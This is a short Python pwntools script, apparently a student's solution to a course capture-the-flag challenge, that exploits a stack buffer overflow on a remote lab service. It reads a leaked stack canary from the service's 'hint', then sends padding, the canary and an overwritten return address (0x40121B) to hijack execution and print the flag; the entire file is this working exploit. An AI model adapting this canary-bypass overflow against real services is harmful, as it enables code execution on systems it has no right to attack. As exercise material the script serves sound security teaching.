#!/usr/bin/python3

from pwn import *
from pwn import p64
from os import linesep # formatting


io = remote('inf226.puffling.no', 7002)

io.recvuntil(b'? ')
# because if I input junk of size 24, I get seg. fault
# i.e. the 'carrying capacity' is 24
io.sendline(b'24')
print(b'24')

r = io.recvline()
prompt = b"Here's a hint: "
canary = r[r.startswith(prompt) and len(prompt):]


io.recvline()
io.send(cyclic(24) + p64(int(canary, 16)) + cyclic(8) + p64(0x40121B)) 
io.shutdown()

recieved = io.recvall().decode()
flag = recieved.splitlines()[-2]
print(f'Canary value: {canary.decode().replace(linesep, " ")}') # just for fun
print(f'Flag 02: {flag}')



